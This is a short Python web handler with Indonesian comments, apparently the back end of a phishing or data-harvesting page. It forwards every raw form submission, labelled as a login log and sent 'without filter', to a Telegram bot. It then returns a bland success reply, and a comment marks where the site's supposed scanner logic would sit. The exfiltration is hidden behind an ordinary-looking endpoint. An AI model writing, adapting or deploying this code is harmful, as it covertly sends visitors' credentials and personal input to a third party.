import os
import json
import urllib.request
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def kirim_mentah_ke_telegram(data_mentah):
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
    
    if not token or not chat_id:
        return

    # Pesan teks berisi data mentah apa pun yang diinput user di web
    pesan = (
        f"🚨 *LOG MASUK (RAW DATA)* 🚨\n\n"
        f"📝 *Data:* \n`{data_mentah}`\n\n"
        f"⏰ *Waktu:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
    )

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": pesan,
        "parse_mode": "Markdown"
    }
    
    try:
        req = urllib.request.Request(
            url, 
            data=json.dumps(payload).encode('utf-8'), 
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"Gagal mengirim ke Telegram: {e}")

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 1. Ambil data apa pun yang dikirim dari web Anda
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # 2. LANGSUNG KIRIM DATA TERSEBUT KE TELEGRAM (Tanpa Filter)
        if post_data:
            kirim_mentah_ke_telegram(post_data)

        # ----------------------------------------------------------------------
        # SISA LOGIKA SCANNER ASLI BAWAHAN WEB ANDA DI SINI
        # ----------------------------------------------------------------------
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        response = {"status": "success", "message": "Data processed"}
        self.wfile.write(json.dumps(response).encode('utf-8'))
        return

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        return
